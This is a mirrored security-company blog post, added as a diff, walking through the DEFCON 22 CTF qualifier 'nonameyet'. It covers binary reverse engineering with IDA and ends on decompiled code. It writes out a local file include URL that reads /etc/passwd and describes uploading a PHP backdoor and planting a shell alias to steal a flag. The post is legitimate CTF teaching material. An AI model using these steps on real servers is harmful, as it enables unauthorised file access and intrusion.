@@ -1,0 +1,1072 @@
+<!doctype html>
+<!--
+
+    EEEEE  N   N  DDD     GGG     A    M   M  EEEEE
+    EE     NN  N  D  D   G       A A   MM MM  EE
+    EEEE   N N N  D   D G  GGG  A A A  M M M  EEEE
+    EE     N  NN  D  D   G   G  A   A  M   M  EE     ##
+    EEEEE  N   N  DDD     GGG   A   A  M   M  EEEEE  ##
+
+    Thanks for checking out our code!
+    We are always looking for the most inquisitive and creative front-end developers.
+    Contact us at info@endgame.com or check our careers page for openings.
+
+-->
+<html lang="en-us" id='top'>
+
+<!-- Mirrored from www.endgame.com/blog/defcon-capture-the-flag-qualification-challenge-2.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 18 Nov 2014 14:54:54 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge;chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    
+    <title dir="ltr">DEFCON Capture the Flag Qualification Challenge #2 | Endgame.</title>
+    <meta name="description" content="" />
+    <link rel="stylesheet" type="text/css" href="http://cloud.typography.com/6815252/750422/css/fonts.css" />
+    <link href="../css/app.css" rel="stylesheet" type="text/css" />
+</head>
+<body class="inner">
+    <div id='contact-us' class='js-contact-form'>
+    <h1>Sign Up for Endgame News and Communications</h1>
+    <form action="https://www.salesforce.com/servlet/servlet.WebToLead?encoding=UTF-8" method="POST">
+	<input type=hidden name="oid" value="00Dd0000000e4Bs">
+	<input type=hidden name="retURL" value="../index.html">
+	<label for="first_name">First Name</label><input  required id="first_name" name="first_name" type="text" /><br>
+	<label for="last_name">Last Name</label><input  required id="last_name" name="last_name" type="text" /><br>
+	<label for="email">Email</label><input  required id="email" name="email" type="text" /><br>
+	<label for="company">Company</label><input  required id="company" name="company" type="text" /><br>
+	<label for="title">Title</label><input  required id="title" name="title" type="text" /><br>
+	<input type="submit" class='button--red' name="submit">
+    </form>
+    </div>
+    <header role="banner" class="cf">
+        <h2>
+            <a href="../index.html">
+                <img class='logo2' alt="Endgame logo" src="images/logo.png" />
+                <div class="period" data-url="/"></div>
+            </a>
+        </h2>
+        <span class="brgr-brdr m" id="brgr-brdr"></span>
+        <span class="brgr-menu m" id="brgr-menu"></span>
+        <nav>
+            <ul id="nav">
+                <li>
+                    <a href="../capabilities/index.html">Capabilities</a>
+                </li>
+                <li>
+                    <a href="../federal/index.html">Federal</a>
+                </li>
+                <li>
+                    <a href="../about/index.html">About</a>
+                </li>
+                <li>
+                    <a href="../news/index.html">Blog &amp; News</a>
+                </li>
+                <li>
+                    <a href="../careers/index.html">Careers</a>
+                </li>
+                <li class='contact-dropdown'>
+                    <span>
+                        <em>Contact</em>
+                    </span>
+                </li>
+                <div id="contact-wrap">
+                    <div id="contact">
+                        <p class="media">
+                            <img src="../images/contact-media.svg" />
+                            <strong>Media Inquiries:</strong><br />
+                            <a href="mailto:media@endgame.com">media@endgame.com</a>
+                        </p>
+                        <p class="general">
+                            <img src="../images/contact-general.svg">
+                            <strong>General Inquiries</strong><br />
+			    <a href="mailto:info@endgame.com">info@endgame.com</a>
+                        </p>
+                        <p class="location">
+                            <img src="../images/contact-location.svg">
+                            <a href="../careers/index.html#locations">3101 Wilson Blvd., Suite 500<br />Arlington, VA 22201</a>
+                        </p>
+			<p class='newsletter'>
+			  <img src='../images/icons/mail.svg'>
+			  <strong><a href='#' class='js-open-contact-form contact-form-icon'>Sign Up for News</a></strong>
+			</p>
+                        <p class="social">
+                            <a href="https://www.facebook.com/EndgameInc">
+                                <img src="../images/icons/facebook.svg" />
+                            </a>
+                            <a href="https://twitter.com/EndgameInc">
+                                <img src="../images/icons/twitter.svg" />
+                            </a>
+                            <a href="http://www.linkedin.com/company/endgame">
+                                <img src="../images/icons/linkedin.svg" />
+                            </a>
+                        </p>
+                    </div>
+                </div>
+            </ul>
+        </nav>
+    </header>
+
+    <div role="main" class="boiler">
+        <h1>DEFCON Capture the Flag Qualification Challenge #2</h1>
+        
+<h3 id="by_steve_vittitoe">by <a href="../archives/index.html">Steve Vittitoe</a></h3>
+
+<p>This is my second post in a series on DEFCON 22 CTF Qualifications. <a href="defcon-capture-the-flag-qualification-challenge-1.html">Last time</a> I examined a problem called shitsco and gave a short overview of CTF. This week, I’d like to walk you through another DEFCON Qualification problem: “nonameyet” from HJ. This problem was worth 3 points and was opened late in the game. It was solved by 10 teams but, sadly, my team, Samurai, was not one of them. I managed to land this one about an hour after the game ended. It’s a common theme among CTF players that they don’t stop after the game ends. There’s always some measure of personal pride on the line when it comes to solving these problems, regardless of points earned.</p>
+
+<p>The problem description for nonameyet is:</p>
+<div class='highlight'><pre><code class='java'><span class='n'>I</span> <span class='n'>claim</span> <span class='n'>no</span> <span class='n'>responsibility</span> <span class='k'>for</span> <span class='n'>the</span> <span class='n'>things</span> <span class='n'>posted</span> <span class='n'>here</span><span class='o'>.</span> <span class='n'>nonameyet_27d88d682935932a8b3618ad3c2772ac</span><span class='o'>.</span><span class='mi'>2014</span><span class='o'>.</span><span class='na'>shallweplayaga</span><span class='o'>.</span><span class='na'>me</span><span class='o'>:</span><span class='mi'>80</span>
+</code></pre></div>
+<p>There is no download link provided and the service is running on port 80. We are to assume that this is a web challenge. Browsing to the web application I see that it allows users to upload photos to a /photos directory, hence the disclaimer in the problem description. Whenever a file upload capability is involved in a CTF web challenge, you can bet that it will be a source of a vulnerability. I have yet to see a web application problem in a CTF that provided a counter example.</p>
+
+<p>One of the URLs for the web application looked like this:</p>
+<div class='highlight'><pre><code class='java'><span class='nl'>http:</span><span class='c1'>//nonameyet_27d88d682935932a8b3618ad3c2772ac.2014.shallweplayaga.me/index.php?page=xxxxxxx</span>
+</code></pre></div>
+<p>When I see page=xxxxxxx referencing a filename there is potential for a local file include vulnerability. Indeed, if I visit:</p>
+<div class='highlight'><pre><code class='java'><span class='nl'>http:</span><span class='c1'>//nonameyet_27d88d682935932a8b3618ad3c2772ac.2014.shallweplayaga.me/index.php?page=/etc/passwd</span>
+</code></pre></div>
+<p>I am able to view the shadowed password file on the server. So far, so good. Unfortunately, asking for the flag file directly yields an error. Of course, a 3 point problem would never be so easy in this CTF. Let’s turn our attention back to the file upload.</p>
+
+<p>The page with the HTML for the upload form is upfile.html. This is loaded with a “?page=upfile.html” on the end of the URL. Examining the HTML source code on this file shows that our form data is submitted to /cgi-bin/nonameyet.cgi. We can recover this CGI program with a simple wget command:</p>
+<div class='highlight'><pre><code class='java'> <span class='n'>$</span> <span class='n'>wget</span> <span class='nl'>http:</span><span class='c1'>//nonameyet_27d88d682935932a8b3618ad3c2772ac.2014.shallweplayaga.me/index.php\?page\=cgi-bin/nonameyet.cgi</span>
+
+<span class='n'>$</span> <span class='n'>file</span> <span class='n'>nonameyet</span><span class='o'>.</span><span class='na'>cgi</span>
+
+<span class='n'>nonameyet</span><span class='o'>.</span><span class='na'>cgi</span><span class='o'>:</span> <span class='n'>ELF</span> <span class='mi'>32</span><span class='o'>-</span><span class='n'>bit</span> <span class='n'>LSB</span> <span class='n'>executable</span><span class='o'>,</span> <span class='n'>Intel</span> <span class='mi'>80386</span><span class='o'>,</span> <span class='n'>version</span> <span class='mi'>1</span> <span class='o'>(</span><span class='n'>SYSV</span><span class='o'>),</span> <span class='n'>dynamically</span> <span class='n'>linked</span> <span class='o'>(</span><span class='n'>uses</span> <span class='n'>shared</span> <span class='n'>libs</span><span class='o'>),</span> <span class='n'>stripped</span>
+</code></pre></div>
+<p>You can find a copy of nonameyet.cgi <a href="https://dl.dropboxusercontent.com/u/89410065/nonameyet.cgi">here</a></p>
+
+<p>More interestingly, it is also possible to use the upload form to upload anything at all. This just begs to have a PHP backdoor uploaded to the system. We put a simple PHP file manager on http://nonameyet_27d88d682935932a8b3618ad3c2772ac.2014.shallweplayaga.me/cgi-bin/photos/1.php and used that to look around the directory structure and permissions placed on the files. Specifically, we could see that the /home/nonameyet/flag file was owned by nonameyet:nonameyet. I need to gain execution as this user to retrieve the flag. The web server executing the PHP scripts (including our backdoor) was running as the web server user.</p>
+
+<p>It is important to note that getting a shell on a box provides an opportunity for many new attack vectors. For this problem, it was actually solved by other teams editing the file /home/nonameyet/.bash_aliases to include an alias that would copy the /home/nonameyet/flag file to /tmp with world readable permissions. The next time anyone popped a shell on this box and ran “ls” they would hand the flag over to another team. This was a very clever and devious thing to do—and in some sense, this is what CTF is all about.</p>
+
+<p>I believe that having this file editable was an oversight on the part of the organizers. This file should not have been writeable. It was a great advantage for the teams that realized this mistake because they were free to look at other problems while waiting for someone else to come along and solve it the “legitimate” way. Furthermore, anyone that thought to look in /tmp before the flag was cleaned up could score points too. Lesson learned: Always poke around more and possibly set up some sort of monitoring for these kinds of issues. I wish I had thought of this first!</p>
+
+<h3 id="binary_analysis">Binary Analysis</h3>
+
+<p>I went straight for the binary in the problem. The binary was not marked SUID so there must be some webserver magic launching the CGI program as the nonameyet user. Indeed, HJ confirmed that he was using a modified version of suexec after the game. I have already run a file command to see that the CGI program is an ELF 32-bit program. My usual next step is to run strings.</p>
+<div class='highlight'><pre><code class='java'><span class='n'>$</span> <span class='n'>strings</span> <span class='n'>nonameyet</span><span class='o'>.</span><span class='na'>cgi</span>
+<span class='err'>…</span>
+</code></pre></div>
+<p>I see imports for C functions related to string parsing and file operations including dangerous APIs like strcpy() and sprintf(). I see a list of the errors the CGI program will return and input variables like photo, time, and date. There are some chunks of HTML and HTTP headers too. So far, it is a fairly typical CGI program. If you try to run it you will get an error 900 printed out to you with HTML tags. A quick strace shows that it is looking for the photos directory. Create this directory and you will move on to the program prompting you for input. Just enter ^D to signal an end of file and you will receive an error 902. Back to the strings. One string that really caught my eye was the “cgilib” string. This is indicative of a cgilib library. There were other strings that pointed to a library as well, such as the “/tmp/cgilibXXXXXX” string.</p>
+
+<p><a href="http://www.infodrom.org/projects/cgilib/">Cgilib</a> is a “library [that] provides a simple and lightweight interface to the Common Gateway Interface (CGI) for C and C++ programs. Its purpose is to provide an easy to use interface to CGI for fast CGI programs written in the C or C++ programming language.” It is also an open source project. We can see from the output of the file command that the nonameyet.cgi program is dynamically linked, so let’s take a quick peek with ldd to see if cgilib is statically compiled into the binary or dynamically loaded at runtime from our system library.</p>
+<div class='highlight'><pre><code class='java'><span class='n'>$</span> <span class='n'>ldd</span> <span class='n'>nonameyet</span><span class='o'>.</span><span class='na'>cgi</span>
+    <span class='n'>linux</span><span class='o'>-</span><span class='n'>gate</span><span class='o'>.</span><span class='na'>so</span><span class='o'>.</span><span class='mi'>1</span> <span class='o'>=&gt;</span>  <span class='o'>(</span><span class='mh'>0xb77dd000</span><span class='o'>)</span>
+    <span class='n'>libc</span><span class='o'>.</span><span class='na'>so</span><span class='o'>.</span><span class='mi'>6</span> <span class='o'>=&gt;</span> <span class='o'>/</span><span class='n'>lib</span><span class='o'>/</span><span class='n'>i386</span><span class='o'>-</span><span class='n'>linux</span><span class='o'>-</span><span class='n'>gnu</span><span class='o'>/</span><span class='n'>libc</span><span class='o'>.</span><span class='na'>so</span><span class='o'>.</span><span class='mi'>6</span> <span class='o'>(</span><span class='mh'>0xb761e000</span><span class='o'>)</span>
+    <span class='o'>/</span><span class='n'>lib</span><span class='o'>/</span><span class='n'>ld</span><span class='o'>-</span><span class='n'>linux</span><span class='o'>.</span><span class='na'>so</span><span class='o'>.</span><span class='mi'>2</span> <span class='o'>(</span><span class='mh'>0xb77de000</span><span class='o'>)</span>
+</code></pre></div>
+<p>We do not see cgilib on the list returned form ldd, so the cgilib library is statically linked. That is to say that if the cgilib binary is used in this program, it must have been compiled into the binary, which means that I could have source code for a good chunk of this problem. That would be a great aid in the reverse engineering process. One way to match up statically compiled libraries into CTF binaries is to use the IDA Pro FLAIR tool to generate a FLIRT signature that can be applied to the binary.</p>
+
+<p>Which version of the library should I grab? The reverse lookup on the IP address used for this problem pointed to an Amazon EC2 server. I created an EC2 instance running the latest version of Ubuntu and applied all updates. It is important to mirror the game box as closely as possible. It is even better if we can run from the same ISP. I installed cgilib with this command:</p>
+<div class='highlight'><pre><code class='java'><span class='n'>$</span> <span class='n'>sudo</span> <span class='n'>apt</span><span class='o'>-</span><span class='n'>get</span> <span class='n'>install</span> <span class='n'>cgilib</span>
+</code></pre></div>
+<p>This added a file in /usr/lib/cgilib.a. I pulled this file back to my analysis machine with FLAIR installed and ran:</p>
+<div class='highlight'><pre><code class='java'><span class='nl'>C:</span><span class='err'>\</span><span class='o'>&gt;</span> <span class='n'>pelf</span> <span class='o'>-</span><span class='n'>a</span> <span class='n'>libcgi</span><span class='o'>.</span><span class='na'>a</span>
+<span class='nl'>C:</span><span class='err'>\</span><span class='o'>&gt;</span> <span class='n'>sigmake</span> <span class='o'>-</span><span class='n'>n</span> <span class='s'>&quot;libcgi&quot;</span> <span class='n'>libcgi</span><span class='o'>.</span><span class='na'>pat</span> <span class='n'>libcgi</span><span class='o'>.</span><span class='na'>sig</span>
+</code></pre></div>
+<p>The first command “pelf” will parse the library file and generate patterns for all exported symbols. The output of the command is put into the libcgi.pat file. The next “sigmake” command will read from the libcgi.pat file and create a binary representation that is output in the libcgi.sig file. This sig file can then be copied into the IDA Pro /sig directory and applied to a live database. All of this completely failed. No symbols were applied. I have not identified why. Bummer.</p>
+
+<p>Thankfully, the library is very simple and almost all of the functions contain unique strings. We can download the source code for libcgi, find a function we are interested in, find a string used in that function, then find the same string in IDA Pro. Once we find the string in IDA we can press ‘x’ while the cursor is positioned on that string to find cross-references. If we follow the (hopefully) single cross-reference that exists, we can then name the function referencing that string as it is named in the source code for cgilib. It is a bit slower than FLIRT signatures but we will be able to flag a significant portion of the program as “uninteresting” right away. For example, if we look at the cgiReadFile function in the cgilib source code cgilib-0.7/cgi.c:</p>
+<div class='highlight'><pre><code class='java'><span class='kt'>char</span> <span class='o'>*</span><span class='n'>cgiReadFile</span> <span class='o'>(</span><span class='n'>FILE</span> <span class='o'>*</span><span class='n'>stream</span><span class='o'>,</span> <span class='kt'>char</span> <span class='o'>*</span><span class='n'>boundary</span><span class='o'>)</span>
+<span class='o'>{</span>
+    <span class='kt'>char</span> <span class='o'>*</span><span class='n'>crlfboundary</span><span class='o'>,</span> <span class='o'>*</span><span class='n'>buf</span><span class='o'>;</span>
+    <span class='n'>size_t</span> <span class='n'>boundarylen</span><span class='o'>;</span>
+    <span class='kt'>int</span> <span class='n'>c</span><span class='o'>;</span>
+    <span class='n'>unsigned</span> <span class='kt'>int</span> <span class='n'>pivot</span><span class='o'>;</span>
+    <span class='kt'>char</span> <span class='o'>*</span><span class='n'>cp</span><span class='o'>;</span>
+    <span class='kt'>char</span> <span class='n'>template</span><span class='o'>[]=</span> <span class='s'>&quot;/tmp/cgilibXXXXXX&quot;</span><span class='o'>;</span>
+    <span class='n'>FILE</span> <span class='o'>*</span><span class='n'>tmpfile</span><span class='o'>;</span>
+    <span class='kt'>int</span> <span class='n'>fd</span><span class='o'>;</span>
+</code></pre></div>
+<p>We can then find the /tmp/cgilibXXXXXX string in IDA Pro with a “search sequence of bytes”.</p>
+
+<p><img src="../uploads/Photo%201.png" alt="Photo 1.png" /></p>
+
+<p>This will fail! As it turns out, there is a compiler optimization used on this function causing the string to be loaded as an immediate value on the stack. This is also sometimes used in programs that want to make string analysis more difficult on the reverse engineer. Indeed, if we go back and look at the string output our first clue is there:</p>
+<div class='highlight'><pre><code class='java'><span class='o'>~</span><span class='n'>$</span> <span class='n'>strings</span> <span class='n'>nonameyet</span><span class='o'>.</span><span class='na'>cgi</span>
+<span class='err'>…</span>
+<span class='o'>/</span><span class='n'>tmp</span>
+<span class='o'>/</span><span class='n'>cgi</span>
+<span class='n'>libX</span>
+<span class='n'>XXXXf</span>
+<span class='err'>…</span>
+</code></pre></div>
+<p>They are broken up into groups of 4. This is because they are referenced as immediate DWORD values being moved into memory. Let’s repeat the search using a smaller string. If we search for “/tmp” we see exactly one spot in the binary where this appears. Here is how IDA shows the string data being loaded onto the stack:</p>
+
+<p><img src="../uploads/Photo%202.png" alt="Photo 2.png" /></p>
+
+<p>We can now go to the top of this function and name it (‘n’ key) “cgiReadFile.” If you go through the rest of cgi.c you will end up with the following functions named:</p>
+
+<p><img src="../uploads/Photo%203.png" alt="Photo 3.png" /></p>
+
+<p>The function named cgi_print (my name, not the cgilib name) is frequently called to output error messages that would be useful for debugging purposes. A quick look at this function reveals that if we set dword_804f0dc (normally 0 in the .bss) to something greater than arg0 (I assume this is a logging level?) we can get debugging output from the binary. In gdb the command to do this is:</p>
+<div class='highlight'><pre><code class='java'><span class='kt'>int</span> <span class='n'>__usercall</span> <span class='n'>main</span><span class='err'>@</span><span class='o'>&lt;</span><span class='n'>eax</span><span class='o'>&gt;(</span><span class='kt'>char</span> <span class='o'>*</span><span class='n'>a1</span><span class='err'>@</span><span class='o'>&lt;</span><span class='n'>esi</span><span class='o'>&gt;)</span>
+<span class='o'>{</span>
+  <span class='kt'>int</span> <span class='n'>result</span><span class='o'>;</span> <span class='c1'>// eax@2</span>
+  <span class='kt'>void</span> <span class='o'>*</span><span class='n'>v2</span><span class='o'>;</span> <span class='c1'>// eax@15</span>
+  <span class='kt'>int</span> <span class='n'>v3</span><span class='o'>;</span> <span class='c1'>// [sp+1Ch] [bp-4Ch]@1</span>
+  <span class='kt'>int</span> <span class='n'>v4</span><span class='o'>;</span> <span class='c1'>// [sp+20h] [bp-48h]@9</span>
+  <span class='kt'>int</span> <span class='n'>v5</span><span class='o'>;</span> <span class='c1'>// [sp+24h] [bp-44h]@5</span>
+  <span class='kt'>int</span> <span class='n'>v6</span><span class='o'>;</span> <span class='c1'>// [sp+28h] [bp-40h]@9</span>
+  <span class='kt'>int</span> <span class='n'>v7</span><span class='o'>;</span> <span class='c1'>// [sp+2Ch] [bp-3Ch]@5</span>
+  <span class='kt'>int</span> <span class='n'>v8</span><span class='o'>;</span> <span class='c1'>// [sp+30h] [bp-38h]@9</span>
+  <span class='kt'>int</span> <span class='n'>v9</span><span class='o'>;</span> <span class='c1'>// [sp+34h] [bp-34h]@5</span>
+  <span class='kt'>int</span> <span class='n'>v10</span><span class='o'>;</span> <span class='c1'>// [sp+38h] [bp-30h]@9</span>
+  <span class='kt'>int</span> <span class='n'>v11</span><span class='o'>;</span> <span class='c1'>// [sp+3Ch] [bp-2Ch]@5</span>
+  <span class='kt'>int</span> <span class='n'>v12</span><span class='o'>;</span> <span class='c1'>// [sp+40h] [bp-28h]@9</span>
+  <span class='kt'>int</span> <span class='n'>v13</span><span class='o'>;</span> <span class='c1'>// [sp+44h] [bp-24h]@5</span>
+  <span class='kt'>int</span> <span class='n'>v14</span><span class='o'>;</span> <span class='c1'>// [sp+48h] [bp-20h]@9</span>
+  <span class='n'>size_t</span> <span class='n'>file_size</span><span class='o'>;</span> <span class='c1'>// [sp+4Ch] [bp-1Ch]@1</span>
+  <span class='kd'>const</span> <span class='kt'>void</span> <span class='o'>*</span><span class='n'>v16</span><span class='o'>;</span> <span class='c1'>// [sp+50h] [bp-18h]@1</span>
+  <span class='kt'>void</span> <span class='o'>*</span><span class='n'>s_cgi</span><span class='o'>;</span> <span class='c1'>// [sp+54h] [bp-14h]@1</span>
+  <span class='kt'>int</span> <span class='n'>photo</span><span class='o'>;</span> <span class='c1'>// [sp+58h] [bp-10h]@1</span>
+  <span class='kt'>int</span> <span class='n'>v19</span><span class='o'>;</span> <span class='c1'>// [sp+5Ch] [bp-Ch]@1</span>
+
+  <span class='n'>v16</span> <span class='o'>=</span> <span class='mi'>0</span><span class='o'>;</span>
+  <span class='n'>file_size</span> <span class='o'>=</span> <span class='mi'>0</span><span class='o'>;</span>
+  <span class='n'>s_cgi</span> <span class='o'>=</span> <span class='mi'>0</span><span class='o'>;</span>
+  <span class='n'>photo</span> <span class='o'>=</span> <span class='mi'>0</span><span class='o'>;</span>
+  <span class='n'>v19</span> <span class='o'>=</span> <span class='mi'>0</span><span class='o'>;</span>
+  <span class='n'>memset</span><span class='o'>(&amp;</span><span class='n'>v3</span><span class='o'>,</span> <span class='mi'>0</span><span class='o'>,</span> <span class='mh'>0x30</span><span class='n'>u</span><span class='o'>);</span>
+  <span class='n'>s_cgi</span> <span class='o'>=</span> <span class='n'>cgiInit</span><span class='o'>();</span>
+  <span class='n'>v19</span> <span class='o'>=</span> <span class='n'>open</span><span class='o'>(</span><span class='s'>&quot;./photos&quot;</span><span class='o'>,</span> <span class='mi'>0</span><span class='o'>);</span>
+  <span class='k'>if</span> <span class='o'>(</span> <span class='n'>v19</span> <span class='o'>==</span> <span class='o'>-</span><span class='mi'>1</span> <span class='o'>)</span>
+  <span class='o'>{</span>
+    <span class='n'>write_headers</span><span class='o'>();</span>
+    <span class='n'>printf</span><span class='o'>(</span><span class='s'>&quot;&lt;p&gt;ERROR: 900&lt;/p&gt;&quot;</span><span class='o'>);</span>
+    <span class='n'>result</span> <span class='o'>=</span> <span class='mi'>0</span><span class='o'>;</span>
+  <span class='o'>}</span>
+  <span class='k'>else</span> <span class='nf'>if</span> <span class='o'>(</span> <span class='n'>fchdir</span><span class='o'>(</span><span class='n'>v19</span><span class='o'>)</span> <span class='o'>==</span> <span class='o'>-</span><span class='mi'>1</span> <span class='o'>)</span>
+  <span class='o'>{</span>
+    <span class='n'>write_headers</span><span class='o'>();</span>
+    <span class='n'>printf</span><span class='o'>(</span><span class='s'>&quot;&lt;p&gt;ERROR: 901&lt;/p&gt;&quot;</span><span class='o'>);</span>
+    <span class='n'>close</span><span class='o'>(</span><span class='n'>v19</span><span class='o'>);</span>
+    <span class='n'>result</span> <span class='o'>=</span> <span class='mi'>0</span><span class='o'>;</span>
+  <span class='o'>}</span>
+  <span class='k'>else</span>
+  <span class='o'>{</span>
+    <span class='n'>close</span><span class='o'>(</span><span class='n'>v19</span><span class='o'>);</span>
+    <span class='n'>photo</span> <span class='o'>=</span> <span class='n'>cgiGetFile</span><span class='o'>((</span><span class='kt'>int</span><span class='o'>)</span><span class='n'>s_cgi</span><span class='o'>,</span> <span class='s'>&quot;photo&quot;</span><span class='o'>);</span>
+    <span class='n'>v3</span> <span class='o'>=</span> <span class='n'>cgiGetValue</span><span class='o'>((</span><span class='kt'>int</span><span class='o'>)</span><span class='n'>s_cgi</span><span class='o'>,</span> <span class='s'>&quot;base&quot;</span><span class='o'>);</span>
+    <span class='n'>v7</span> <span class='o'>=</span> <span class='n'>cgiGetValue</span><span class='o'>((</span><span class='kt'>int</span><span class='o'>)</span><span class='n'>s_cgi</span><span class='o'>,</span> <span class='s'>&quot;time&quot;</span><span class='o'>);</span>
+    <span class='n'>v9</span> <span class='o'>=</span> <span class='n'>cgiGetValue</span><span class='o'>((</span><span class='kt'>int</span><span class='o'>)</span><span class='n'>s_cgi</span><span class='o'>,</span> <span class='s'>&quot;date&quot;</span><span class='o'>);</span>
+    <span class='n'>v11</span> <span class='o'>=</span> <span class='n'>cgiGetValue</span><span class='o'>((</span><span class='kt'>int</span><span class='o'>)</span><span class='n'>s_cgi</span><span class='o'>,</span> <span class='s'>&quot;pixy&quot;</span><span class='o'>);</span>
+    <span class='n'>v13</span> <span class='o'>=</span> <span class='n'>cgiGetValue</span><span class='o'>((</span><span class='kt'>int</span><span class='o'>)</span><span class='n'>s_cgi</span><span class='o'>,</span> <span class='s'>&quot;pixx&quot;</span><span class='o'>);</span>
+    <span class='n'>v5</span> <span class='o'>=</span> <span class='n'>cgiGetValue</span><span class='o'>((</span><span class='kt'>int</span><span class='o'>)</span><span class='n'>s_cgi</span><span class='o'>,</span> <span class='s'>&quot;genr&quot;</span><span class='o'>);</span>
+    <span class='k'>if</span> <span class='o'>(</span> <span class='n'>photo</span> <span class='o'>)</span>
+    <span class='o'>{</span>
+      <span class='k'>if</span> <span class='o'>(</span> <span class='o'>!</span><span class='n'>v3</span> <span class='o'>)</span>
+        <span class='n'>v3</span> <span class='o'>=</span> <span class='o'>*(</span><span class='n'>_DWORD</span> <span class='o'>*)(</span><span class='n'>photo</span> <span class='o'>+</span> <span class='mi'>8</span><span class='o'>);</span>
+      <span class='n'>v4</span> <span class='o'>=</span> <span class='n'>urldecode</span><span class='o'>(</span><span class='n'>v3</span><span class='o'>);</span>
+      <span class='n'>v8</span> <span class='o'>=</span> <span class='n'>urldecode</span><span class='o'>(</span><span class='n'>v7</span><span class='o'>);</span>
+      <span class='n'>v6</span> <span class='o'>=</span> <span class='n'>urldecode</span><span class='o'>(</span><span class='n'>v5</span><span class='o'>);</span>
+      <span class='n'>v10</span> <span class='o'>=</span> <span class='n'>urldecode</span><span class='o'>(</span><span class='n'>v9</span><span class='o'>);</span>
+      <span class='n'>v12</span> <span class='o'>=</span> <span class='n'>urldecode</span><span class='o'>(</span><span class='n'>v11</span><span class='o'>);</span>
+      <span class='n'>v14</span> <span class='o'>=</span> <span class='n'>urldecode</span><span class='o'>(</span><span class='n'>v13</span><span class='o'>);</span>
+      <span class='n'>v16</span> <span class='o'>=</span> <span class='n'>read_file</span><span class='o'>(*(</span><span class='kt'>char</span> <span class='o'>**)(</span><span class='n'>photo</span> <span class='o'>+</span> <span class='mi'>12</span><span class='o'>),</span> <span class='o'>(</span><span class='kt'>int</span><span class='o'>)&amp;</span><span class='n'>file_size</span><span class='o'>);</span>
+      <span class='k'>if</span> <span class='o'>(</span> <span class='n'>v16</span> <span class='o'>)</span>
+      <span class='o'>{</span>
+        <span class='k'>if</span> <span class='o'>(</span> <span class='n'>file_size</span> <span class='o'>)</span>
+        <span class='o'>{</span>
+          <span class='k'>if</span> <span class='o'>(</span> <span class='o'>(</span><span class='n'>interesting</span><span class='o'>((</span><span class='kt'>int</span><span class='o'>)&amp;</span><span class='n'>file_size</span><span class='o'>,</span> <span class='n'>a1</span><span class='o'>,</span> <span class='o'>(</span><span class='kt'>int</span><span class='o'>)&amp;</span><span class='n'>v3</span><span class='o'>)</span> <span class='o'>&amp;</span> <span class='mh'>0x80000000</span><span class='o'>)</span> <span class='o'>==</span> <span class='mi'>0</span> <span class='o'>)</span>
+          <span class='o'>{</span>
+            <span class='n'>v2</span> <span class='o'>=</span> <span class='n'>base64encode</span><span class='o'>(</span><span class='n'>v3</span><span class='o'>,</span> <span class='n'>v4</span><span class='o'>);</span>
+            <span class='n'>combine_strings</span><span class='o'>(</span><span class='s'>&quot;Cookie&quot;</span><span class='o'>,</span> <span class='n'>v2</span><span class='o'>);</span>
+            <span class='n'>write_headers</span><span class='o'>();</span>
+            <span class='n'>cgiFree</span><span class='o'>(</span><span class='n'>s_cgi</span><span class='o'>);</span>
+            <span class='n'>v19</span> <span class='o'>=</span> <span class='n'>open</span><span class='o'>((</span><span class='kd'>const</span> <span class='kt'>char</span> <span class='o'>*)</span><span class='n'>v3</span><span class='o'>,</span> <span class='mi'>66</span><span class='o'>,</span> <span class='mi'>420</span><span class='o'>);</span>
+            <span class='k'>if</span> <span class='o'>(</span> <span class='n'>v19</span> <span class='o'>==</span> <span class='o'>-</span><span class='mi'>1</span> <span class='o'>)</span>
+            <span class='o'>{</span>
+              <span class='n'>printf</span><span class='o'>(</span><span class='s'>&quot;&lt;p&gt;ERROR: 906&lt;/p&gt;&quot;</span><span class='o'>,</span> <span class='n'>v3</span><span class='o'>);</span>
+            <span class='o'>}</span>
+            <span class='k'>else</span>
+            <span class='o'>{</span>
+              <span class='n'>write</span><span class='o'>(</span><span class='n'>v19</span><span class='o'>,</span> <span class='n'>v16</span><span class='o'>,</span> <span class='n'>file_size</span><span class='o'>);</span>
+              <span class='n'>close</span><span class='o'>(</span><span class='n'>v19</span><span class='o'>);</span>
+            <span class='o'>}</span>
+            <span class='n'>printf</span><span class='o'>(</span><span class='s'>&quot;&lt;meta http-equiv=&#39;refresh&#39; content=&#39;0;url=../thanks.php&#39;&gt;&quot;</span><span class='o'>);</span>
+            <span class='n'>result</span> <span class='o'>=</span> <span class='mi'>0</span><span class='o'>;</span>
+          <span class='o'>}</span>
+          <span class='k'>else</span>
+          <span class='o'>{</span>
+            <span class='n'>write_headers</span><span class='o'>();</span>
+            <span class='n'>printf</span><span class='o'>(</span><span class='s'>&quot;&lt;p&gt;ERROR: 905&lt;/p&gt;&quot;</span><span class='o'>);</span>
+            <span class='n'>result</span> <span class='o'>=</span> <span class='mi'>0</span><span class='o'>;</span>
+          <span class='o'>}</span>
+        <span class='o'>}</span>
+        <span class='k'>else</span>
+        <span class='o'>{</span>
+          <span class='n'>write_headers</span><span class='o'>();</span>
+          <span class='n'>printf</span><span class='o'>(</span><span class='s'>&quot;&lt;p&gt;ERROR: 904. Why the hell would you give me an empty file&lt;/p&gt;&quot;</span><span class='o'>);</span>
+          <span class='n'>result</span> <span class='o'>=</span> <span class='mi'>0</span><span class='o'>;</span>
+        <span class='o'>}</span>
+      <span class='o'>}</span>
+      <span class='k'>else</span>
+      <span class='o'>{</span>
+        <span class='n'>write_headers</span><span class='o'>();</span>
+        <span class='n'>printf</span><span class='o'>(</span><span class='s'>&quot;&lt;p&gt;ERROR: 903&lt;/p&gt;&quot;</span><span class='o'>);</span>
+        <span class='n'>result</span> <span class='o'>=</span> <span class='mi'>0</span><span class='o'>;</span>
+      <span class='o'>}</span>
+    <span class='o'>}</span>
+    <span class='k'>else</span>
+    <span class='o'>{</span>
+      <span class='n'>write_headers</span><span class='o'>();</span>
+      <span class='n'>printf</span><span class='o'>(</span><span class='s'>&quot;&lt;p&gt;ERROR: 902&lt;/p&gt;&quot;</span><span class='o'>);</span>
+      <span class='n'>result</span> <span class='o'>=</span> <span class='mi'>0</span><span class='o'>;</span>
+    <span class='o'>}</span>
+  <span class='o'>}</span>
+  <span class='k'>return</span> <span class='n'>result</span><span class='o'>;</span>
+<span class='o'>}</span>
